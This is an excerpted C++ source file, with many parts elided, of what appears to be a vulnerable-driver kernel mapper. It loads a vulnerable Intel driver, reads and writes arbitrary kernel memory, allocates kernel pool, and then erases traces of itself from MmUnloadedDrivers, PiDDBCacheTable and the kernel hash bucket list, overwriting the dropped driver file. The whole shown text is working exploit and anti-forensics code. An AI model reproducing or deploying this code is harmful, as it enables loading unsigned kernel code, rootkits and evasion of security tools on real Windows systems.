...
HANDLE intel_driver::Load()
{
	...
	//--sup--std::cout << "[<] Loading vulnerable driver" << std::endl;
	...
	{
		//--sup--std::cout << "[-] Failed to get temp path" << std::endl;
		return nullptr;
	}
	...
	{
		//--sup--std::cout << "[-] Failed to create vulnerable driver file" << std::endl;
		return nullptr;
	}

	if (!service::RegisterAndStart(driver_path))
	{
		//--sup--std::cout << "[-] Failed to register and start service for the vulnerable driver" << std::endl;
		std::remove(driver_path.c_str());
		return nullptr;
	}
...
{
	//--sup--std::cout << "[<] Unloading vulnerable driver" << std::endl;
	...
	{
		//--sup--std::cout << "[!] Error dumping shit inside the disk" << std::endl;
	}
	else {
		//--sup--std::cout << "[+] Vul driver data destroyed before unlink" << std::endl;
	}
	file_ofstream.close();
	delete[] randomData;
...
bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size)
{
	...
	{
		//--sup--std::cout << "[-] Failed to translate virtual address 0x" << reinterpret_cast<void*>(address) << std::endl;
		return false;
	}
	...
	{
		//--sup--std::cout << "[-] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address) << std::endl;
		return false;
	}
	...
	if (!UnmapIoSpace(device_handle, mapped_physical_memory, size))
		//--sup--std::cout << "[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl;
...
uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size)
{
	...
	{
		//--sup--std::cout << "[!] Failed to find ExAllocatePool" << std::endl;
		return 0;
	}
...
bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle)
{
	...
	if (!ReadMemory(device_handle, object + 0x8, &device_object, sizeof(device_object)) || !device_object) {
		//--sup--std::cout << "[!] Failed to find device_object" << std::endl;
		return false;
	}
	...
	if (!ReadMemory(device_handle, device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object) {
		//--sup--std::cout << "[!] Failed to find driver_object" << std::endl;
		return false;
	}
	...
	if (!ReadMemory(device_handle, driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section) {
		//--sup--std::cout << "[!] Failed to find driver_section" << std::endl;
		return false;
	}
	...
	if (!ReadMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) {
		//--sup--std::cout << "[!] Failed to find driver name" << std::endl;
		return false;
	}
	...
	if (!WriteMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
		//--sup--std::cout << "[!] Failed to write driver name length" << std::endl;
		return false;
	}
...
bool intel_driver::ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait)
{
	...
	if (!kernel_ExAcquireResourceExclusiveLite) {
		//--sup--std::cout << "[!] Failed to find ExAcquireResourceExclusiveLite" << std::endl;
		return 0;
	}
...
bool intel_driver::ExReleaseResourceLite(HANDLE device_handle, PVOID Resource)
{
	...
	if (!kernel_ExReleaseResourceLite) {
		//--sup--std::cout << "[!] Failed to find ExReleaseResourceLite" << std::endl;
		return false;
	}
...
BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer)
{
	...
	if (!kernel_RtlDeleteElementGenericTableAvl) {
		//--sup--std::cout << "[!] Failed to find RtlDeleteElementGenericTableAvl" << std::endl;
		return false;
	}
...
bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTable added on LoadDriver
	...
	if (PiDDBLockPtr == NULL || PiDDBCacheTablePtr == NULL) {
		//--sup--std::cout << "[-] Warning no PiDDBCacheTable Found" << std::endl;
		return false;
	}
	...
	if (!ExAcquireResourceExclusiveLite(device_handle, PiDDBLock, true)) {
		//--sup--std::cout << "[-] Can't lock PiDDBCacheTable" << std::endl;
		return false;
	}
	//--sup--std::cout << "[+] PiDDBLock Locked" << std::endl;

	// search our entry in the table
	PiDDBCacheEntry* pFoundEntry = (PiDDBCacheEntry*)LookupEntry(device_handle, PiDDBCacheTable, iqvw64e_timestamp);
	if (pFoundEntry == nullptr) {
		//--sup--std::cout << "[-] Not found in cache" << std::endl;
	...
	if (!RtlDeleteElementGenericTableAvl(device_handle, PiDDBCacheTable, pFoundEntry)) {
		//--sup--std::cout << "[-] Can't delete from PiDDBCacheTable" << std::endl;
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}
	...
	//--sup--std::cout << "[+] PiDDBCacheTable Cleaned" << std::endl;
...
uintptr_t intel_driver::FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, char* szMask) {
	if (!dwAddress) {
		//--sup--std::cout << "[-] No module address to find pattern" << std::endl;
		return 0;
	}

	if (dwLen > 1024 * 1024 * 1024) { //if read is > 1GB
		//--sup--std::cout << "[-] Can't find pattern, Too big section" << std::endl;
		return 0;
	}
	...
	if (result <= 0) {
		//--sup--std::cout << "[-] Can't find pattern" << std::endl;
		delete[] sectionData;
		return 0;
	}
...
bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
	...
	if (!sig) {
		//--sup--std::cout << "[-] Can't Find g_KernelHashBucketList" << std::endl;
		return false;
	}
	auto sig2 = FindPatternAtKernel(device_handle, (uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), (char*)"xxx");
	if (!sig2) {
		//--sup--std::cout << "[-] Can't Find g_HashCacheLock" << std::endl;
		return false;
	}
	...
	{
		//--sup--std::cout << "[-] Can't Find g_HashCache relative address" << std::endl;
		return false;
	}
	...
	if (!ExAcquireResourceExclusiveLite(device_handle, g_HashCacheLock, true)) {
		//--sup--std::cout << "[-] Can't lock g_HashCacheLock" << std::endl;
		return false;
	}
	//--sup--std::cout << "[+] g_HashCacheLock Locked" << std::endl;
